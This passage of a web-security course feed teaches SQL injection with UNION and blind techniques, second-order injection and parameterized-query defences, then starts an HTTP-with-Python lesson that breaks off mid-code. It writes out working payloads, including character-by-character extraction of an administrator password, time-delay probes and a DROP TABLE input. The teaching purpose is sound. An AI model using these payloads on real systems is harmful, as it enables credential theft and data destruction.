&lt;td>Oracle&lt;/td>
&lt;td>&lt;code>SELECT * FROM v$version&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>PostgreSQL&lt;/td>
&lt;td>&lt;code>SELECT version()&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>For example, you could use a &lt;code>UNION&lt;/code> attack with the following input:&lt;/p>
&lt;p>&lt;code>' UNION SELECT @@version--&lt;/code>&lt;/p>
&lt;p>This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:&lt;/p>
&lt;pre tabindex="0">&lt;code>Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 &amp;lt;X64&amp;gt; (Build 14393: ) (Hypervisor)
&lt;/code>&lt;/pre>&lt;h2 id="blind-sql-injection">Blind SQL injection&lt;/h2>
&lt;p>In this section, we&amp;rsquo;ll describe what blind SQL injection is, explain various techniques for finding and exploiting blind SQL injection vulnerabilities.&lt;/p>
&lt;h3 id="what-is-blind-sql-injection">What is blind SQL injection?&lt;/h3>
&lt;p>Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.&lt;/p>
&lt;p>With blind SQL injection vulnerabilities, many techniques such as UNION attacks are not effective, because they rely on being able to see the results of the injected query within the application&amp;rsquo;s responses.
It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.&lt;/p>
&lt;h3 id="exploiting-blind-sql-injection-by-triggering-conditional-responses">Exploiting blind SQL injection by triggering conditional responses&lt;/h3>
&lt;p>Consider an application that uses tracking cookies to gather analytics about usage.
Requests to the application include a cookie header like this:&lt;/p>
&lt;p>&lt;code>Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4&lt;/code>&lt;/p>
&lt;p>When a request containing a &lt;code>TrackingId&lt;/code> cookie is processed, the application determines whether this is a known user using an SQL query like this:&lt;/p>
&lt;p>&lt;code>SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'&lt;/code>&lt;/p>
&lt;p>This query is vulnerable to SQL injection, but the results from the query are not returned to the user.
However, the application does behave differently depending on whether the query returns any data.
If it returns data (because a recognized &lt;code>TrackingId&lt;/code> was submitted), then a &amp;ldquo;Welcome back&amp;rdquo; message is displayed within the page.&lt;/p>
&lt;p>This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve information by triggering different responses conditionally, depending on an injected condition.
To see how this works, suppose that two requests are sent containing the following &lt;code>TrackingId&lt;/code> cookie values in turn:&lt;/p>
&lt;p>&lt;code>xyz' AND '1'='1&lt;/code>&lt;br/>
&lt;code>xyz' AND '1'='2&lt;/code>&lt;/p>
&lt;p>The first of these values will cause the query to return results, because the injected &lt;code>AND '1'='1&lt;/code> condition is true, and so the &amp;ldquo;Welcome back&amp;rdquo; message will be displayed.
Whereas the second value will cause the query to not return any results, because the injected condition is false, and so the &amp;ldquo;Welcome back&amp;rdquo; message will not be displayed.
This allows us to determine the answer to any single injected condition, and so extract data one bit at a time.&lt;/p>
&lt;p>For example, suppose there is a table called &lt;code>Users&lt;/code> with the columns &lt;code>Username&lt;/code> and &lt;code>Password&lt;/code>, and a user called &lt;code>Administrator&lt;/code>.
We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.&lt;/p>
&lt;p>To do this, we start with the following input:&lt;/p>
&lt;p>&lt;code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) &amp;gt; 'm&lt;/code>&lt;/p>
&lt;p>This returns the &amp;ldquo;Welcome back&amp;rdquo; message, indicating that the injected condition is true, and so the first character of the password is greater than &lt;code>m&lt;/code>.&lt;/p>
&lt;p>Next, we send the following input:&lt;/p>
&lt;p>&lt;code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) &amp;gt; 't&lt;/code>&lt;/p>
&lt;p>This does not return the &amp;ldquo;Welcome back&amp;rdquo; message, indicating that the injected condition is false, and so the first character of the password is not greater than &lt;code>t&lt;/code>.&lt;/p>
&lt;p>Eventually, we send the following input, which returns the &amp;ldquo;Welcome back&amp;rdquo; message, thereby confirming that the first character of the password is &lt;code>s&lt;/code>:&lt;/p>
&lt;p>&lt;code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's&lt;/code>&lt;/p>
&lt;p>We can continue this process to systematically determine the full password for the &lt;code>Administrator&lt;/code> user.&lt;/p>
&lt;p>&lt;strong>NOTE:&lt;/strong>&lt;/p>
&lt;p>The &lt;code>SUBSTRING&lt;/code> function is called &lt;code>SUBSTR&lt;/code> on some types of databases.
For more details, see the &lt;a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet&lt;/a>.&lt;/p>
&lt;h3 id="inducing-conditional-responses-by-triggering-sql-errors">Inducing conditional responses by triggering SQL errors&lt;/h3>
&lt;p>In the preceding example, suppose instead that the application carries out the same SQL query, but does not behave any differently depending on whether the query returns any data.
The preceding technique will not work, because injecting different Boolean conditions makes no difference to the application&amp;rsquo;s responses.&lt;/p>
&lt;p>In this situation, it is often possible to induce the application to return conditional responses by triggering SQL errors conditionally, depending on an injected condition.
This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false.
Very often, an unhandled error thrown by the database will cause some difference in the application&amp;rsquo;s response (such as an error message), allowing us to infer the truth of the injected condition.&lt;/p>
&lt;p>To see how this works, suppose that two requests are sent containing the following &lt;code>TrackingId&lt;/code> cookie values in turn:&lt;/p>
&lt;p>&lt;code>xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a&lt;/code>
&lt;code>xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a&lt;/code>&lt;/p>
&lt;p>These inputs use the &lt;code>CASE&lt;/code> keyword to test a condition and return a different expression depending on whether the expression is true.
With the first input, the &lt;code>CASE&lt;/code> expression evaluates to &lt;code>'a'&lt;/code>, which does not cause any error.
With the second input, it evaluates to &lt;code>1/0&lt;/code>, which causes a divide-by-zero error.
Assuming the error causes some difference in the application&amp;rsquo;s HTTP response, we can use this difference to infer whether the injected condition is true.&lt;/p>
&lt;p>Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:&lt;/p>
&lt;p>&lt;code>xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) &amp;gt; 'm') THEN 1/0 ELSE 'a' END FROM Users)='a&lt;/code>&lt;/p>
&lt;h3 id="exploiting-blind-sql-injection-by-triggering-time-delays">Exploiting blind SQL injection by triggering time delays&lt;/h3>
&lt;p>In the preceding example, suppose that the application now catches database errors and handles them gracefully.
Triggering a database error when the injected SQL query is executed no longer causes any difference in the application&amp;rsquo;s response, so the preceding technique of inducing conditional errors will not work.&lt;/p>
&lt;p>In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays conditionally, depending on an injected condition.
Because SQL queries are generally processed synchronously by the application, delaying the execution of an SQL query will also delay the HTTP response.
This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.&lt;/p>
&lt;p>The techniques for triggering a time delay are highly specific to the type of database being used.
On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:&lt;/p>
&lt;p>&lt;code>'; IF (1=2) WAITFOR DELAY '0:0:10'--&lt;/code>
&lt;code>'; IF (1=1) WAITFOR DELAY '0:0:10'--&lt;/code>&lt;/p>
&lt;p>The first of these inputs will not trigger a delay, because the condition &lt;code>1=2&lt;/code> is false.
The second input will trigger a delay of 10 seconds, because the condition &lt;code>1=1&lt;/code> is true.&lt;/p>
&lt;p>Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:&lt;/p>
&lt;p>&lt;code>'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) &amp;gt; 'm') = 1 WAITFOR DELAY '0:0:{delay}'--&lt;/code>&lt;/p>
&lt;h3 id="second-order-sql-injection">Second Order SQL Injection&lt;/h3>
&lt;p>A Second Order Injection is the same as a traditional injection attack but the payload is already stored in the database intentionally placed so that it can be triggered in another area of code.&lt;/p>
&lt;p>Let’s look at an example and see how easy it is to exploit this vulnerability.
This is a form of registration that uses parameterization, meaning that a vicious input will not affect the database.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$sql&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;INSERT INTO user (username, password) VALUES (:username, :password)&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$data&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#39;username&amp;#39;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&amp;gt;&lt;/span> &lt;span style="color:#000">$userName&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#39;password&amp;#39;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&amp;gt;&lt;/span> &lt;span style="color:#000">$password&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#39;first_name&amp;#39;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&amp;gt;&lt;/span> &lt;span style="color:#000">$firstName&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#39;second_name&amp;#39;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&amp;gt;&lt;/span> &lt;span style="color:#000">$secondName&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$stmt&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">$conn&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">-&amp;gt;&lt;/span>&lt;span style="color:#c4a000">prepare&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$sql&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$stmt&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">-&amp;gt;&lt;/span>&lt;span style="color:#c4a000">execute&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$data&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Suppose, however, that someone introduces the following structure as a name:&lt;/p>
&lt;p>&lt;code>'; DROP TABLE user; --&lt;/code>&lt;/p>
&lt;p>This will not be a problem for this form, however, this MySQL code is in the database, and if another part of the code uses this name it can be executed.
Let&amp;rsquo;s say that we select the user by name use the following code:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$sql&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;SELECT * FROM user WHERE username = &amp;#39;&lt;/span>&lt;span style="color:#4e9a06">{&lt;/span>&lt;span style="color:#000">$userName&lt;/span>&lt;span style="color:#4e9a06">}&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$stmt&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">$conn&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">-&amp;gt;&lt;/span>&lt;span style="color:#c4a000">query&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$sql&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$user&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">$stmt&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">-&amp;gt;&lt;/span>&lt;span style="color:#c4a000">fetch&lt;/span>&lt;span style="color:#000;font-weight:bold">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Because for this piece of code we do not use the parameterization, the code that will be executed will become:&lt;/p>
&lt;p>&lt;code>SELECT * FROM user WHERE username = ''; DROP TABLE user; --';&lt;/code>&lt;/p>
&lt;h3 id="how-to-prevent-blind-sql-injection-attacks">How to prevent &lt;strong>blind&lt;/strong> SQL injection attacks?&lt;/h3>
&lt;p>Although the techniques needed to find and exploit blind SQL injection vulnerabilities are different and more sophisticated than for regular SQL injection, the measures needed to prevent SQL injection are the same regardless of whether the vulnerability is blind or not.&lt;/p>
&lt;h2 id="how-to-prevent-sql-injection">How to prevent SQL injection&lt;/h2>
&lt;p>Most instances of SQL injection can be prevented by using parameterized queries (also known as prepared statements) instead of string concatenation within the query.&lt;/p>
&lt;p>The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">String&lt;/span> &lt;span style="color:#000">query&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;SELECT * FROM products WHERE category = &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#000">input&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">Statement&lt;/span> &lt;span style="color:#000">statement&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">connection&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">createStatement&lt;/span>&lt;span style="color:#000;font-weight:bold">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">ResultSet&lt;/span> &lt;span style="color:#000">resultSet&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">statement&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">executeQuery&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">query&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This code can be easily rewritten in a way that prevents the user input from interfering with the query structure:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">PreparedStatement&lt;/span> &lt;span style="color:#000">statement&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">connection&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">prepareStatement&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;SELECT * FROM products WHERE category = ?&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">statement&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">setString&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">input&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">ResultSet&lt;/span> &lt;span style="color:#000">resultSet&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">statement&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">executeQuery&lt;/span>&lt;span style="color:#000;font-weight:bold">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Parameterized queries can be used for any situation where untrusted input appears as data within the query, including the &lt;code>WHERE&lt;/code> clause and values in an &lt;code>INSERT&lt;/code> or &lt;code>UPDATE&lt;/code> statement.
They can&amp;rsquo;t be used to handle untrusted input in other parts of the query, such as table or column names, or the &lt;code>ORDER BY&lt;/code> clause.
Application functionality that places untrusted data into those parts of the query will need to take a different approach, such as white-listing permitted input values, or using different logic to deliver the required behavior.&lt;/p>
&lt;p>For a parameterized query to be effective in preventing SQL injection, the string that is used in the query must always be a hard-coded constant, and must never contain any variable data from any origin.
Do not be tempted to decide case-by-case whether an item of data is trusted, and continue using string concatenation within the query for cases that are considered safe.
It is all too easy to make mistakes about the possible origin of data, or for changes in other code to violate assumptions about what data is tainted.&lt;/p>
&lt;h1 id="tools">Tools&lt;/h1>
&lt;h2 id="burp-suite">Burp Suite&lt;/h2>
&lt;p>&lt;a href="https://portswigger.net/burp">Burp Suite&lt;/a> is one of the most popular penetration testing and vulnerability finder tools, and is often used for checking web application security.
With this tool you can see all the requests that are executed when interacting with a web application.
You can change the requests to see different behaviors and you can set automatic requests with different parameters.&lt;/p>
&lt;h2 id="sqlmap">SQLmap&lt;/h2>
&lt;p>&lt;a href="https://sqlmap.org/">SQLmap&lt;/a> is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.
It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.
You can see some of the features in this recording.
&lt;a href="https://asciinema.org/a/434673">&lt;img src="https://asciinema.org/a/434673.svg" alt="asciicast">&lt;/a>&lt;/p>
&lt;h1 id="further-reading">Further Reading&lt;/h1>
&lt;p>&lt;strong>1.&lt;/strong> &lt;a href="https://portswigger.net/burp">Burp&lt;/a>&lt;br>
&lt;strong>2.&lt;/strong> &lt;a href="https://portswigger.net/support/configuring-your-browser-to-work-with-burp">Burp Browser Configuration&lt;/a>&lt;br>
&lt;strong>3.&lt;/strong> &lt;a href="https://portswigger.net/support/checking-your-browser-proxy-configuration">Burp Proxy Configuration&lt;/a>&lt;br>
&lt;strong>4.&lt;/strong> &lt;a href="https://portswigger.net/support/installing-burp-suites-ca-certificate-in-your-browser">Burp Certificate&lt;/a>&lt;br>
&lt;strong>5.&lt;/strong> &lt;a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL Cheat Sheet&lt;/a>&lt;br>
&lt;strong>6.&lt;/strong> &lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">SQL Payloads&lt;/a>&lt;br>
&lt;strong>7.&lt;/strong> &lt;a href="https://sqlmap.org/">SQLmap&lt;/a>&lt;/p>
&lt;h1 id="activities">Activities&lt;/h1>
&lt;p>&lt;strong>1.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges">Demo SQL Injection&lt;/a>
&lt;strong>2.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges">Blacklist&lt;/a>
&lt;strong>3.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges">Nightmare Store&lt;/a>
&lt;strong>4.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges">One by one&lt;/a>
&lt;strong>5.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges">T0p S3cr3t&lt;/a>
&lt;strong>6.&lt;/strong> &lt;a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data">Retrieve hidden data&lt;/a>&lt;br>
&lt;strong>7.&lt;/strong> &lt;a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass">Login bypass&lt;/a>&lt;br>
&lt;strong>8.&lt;/strong> &lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">Determine number of columns&lt;/a>&lt;br>
&lt;strong>9.&lt;/strong> &lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">Find column&lt;/a>&lt;br>
&lt;strong>10.&lt;/strong> &lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables">Retrieve data from other tables&lt;/a>&lt;br>
&lt;strong>11.&lt;/strong> &lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column">Single column&lt;/a>&lt;br>
&lt;strong>12.&lt;/strong> &lt;a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle">What version?&lt;/a>&lt;br>
&lt;strong>13.&lt;/strong> &lt;a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft">More versions&lt;/a>&lt;br>
&lt;strong>14.&lt;/strong> &lt;a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses">Conditional responses&lt;/a>&lt;br>
&lt;strong>15.&lt;/strong> &lt;a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors">Conditional errors&lt;/a>&lt;br>
&lt;strong>16.&lt;/strong> &lt;a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays">Time delays&lt;/a>&lt;br>
&lt;strong>17.&lt;/strong> &lt;a href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band">Out-of-band Application Security Testing&lt;/a>&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/hacking-the-web/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/hacking-the-web/</guid><description>
&lt;h1 id="introduction">Introduction&lt;/h1>
&lt;p>&lt;a href="../rediscovering-the-browser/">Last session&lt;/a> we learned how browsers work, what HTTP and HTML are and how to use &lt;code>curl&lt;/code> and &lt;code>wget&lt;/code> to imitate a browser.
Today we&amp;rsquo;ll dive deeper into the inner workings of browsers.
Specifically, we will:&lt;/p>
&lt;ul>
&lt;li>learn how to use the developer tools to inspect the requests it makes&lt;/li>
&lt;li>learn what cookies are&lt;/li>
&lt;li>learn how to use them from the command line&lt;/li>
&lt;li>learn how to write Python scripts that send HTTP requests&lt;/li>
&lt;/ul>
&lt;h1 id="reminders-and-prerequisites">Reminders and Prerequisites&lt;/h1>
&lt;p>Remember these concepts from the &lt;a href="../rediscovering-the-browser/">previous session&lt;/a>:&lt;/p>
&lt;ul>
&lt;li>by default, HTTP is a &lt;strong>stateless&lt;/strong> protocol.
Every request is independent from any other&lt;/li>
&lt;li>HTTP supports fixed methods, such as &lt;code>GET&lt;/code>, &lt;code>PUT&lt;/code>, &lt;code>POST&lt;/code> etc.&lt;/li>
&lt;li>HTTP servers respond with status codes and, optionally, data.&lt;/li>
&lt;li>web browsers such as Firefox are HTTP clients&lt;/li>
&lt;li>&lt;code>curl&lt;/code> and &lt;code>wget&lt;/code> are used to send HTTP requests and to download files, respectively&lt;/li>
&lt;/ul>
&lt;p>For this session, you need:&lt;/p>
&lt;ul>
&lt;li>a working internet connection&lt;/li>
&lt;li>basic knowledge of the HTTP protocol&lt;/li>
&lt;li>a Linux machine&lt;/li>
&lt;li>a Firefox browser&lt;/li>
&lt;li>a Python interpreter (at least Python3.6)&lt;/li>
&lt;/ul>
&lt;h1 id="sending-http-requests-from-python">Sending HTTP Requests from Python&lt;/h1>
&lt;p>The module we need in order to handle requests in Python is called &lt;code>requests&lt;/code>.
It contains methods for all types of HTTP requests: &lt;code>GET&lt;/code>, &lt;code>POST&lt;/code>, etc.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">import&lt;/span> &lt;span style="color:#000">requests&lt;/span> &lt;span style="color:#204a87;font-weight:bold">as&lt;/span> &lt;span style="color:#000">req&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">URL&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;https://httpbin.org&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># Send a `GET` request.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># `params` is a dictionary of query parameters.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># `response` is an object.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">response&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">req&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">get&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">f&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;&lt;/span>&lt;span style="color:#4e9a06">{&lt;/span>&lt;span style="color:#000">URL&lt;/span>&lt;span style="color:#4e9a06">}&lt;/span>&lt;span style="color:#4e9a06">/get&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">params&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#000;font-weight:bold">{&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;SSS&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;role&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;boss&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># This request is equivalent to:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># GET URL?name=SSS?role=boss&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># We must access its fields to gain specific information.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">response&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">status_code&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#8f5902;font-style:italic"># The status code returned by the server&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">response&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">text&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#8f5902;font-style:italic"># The HTML sent by the server&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
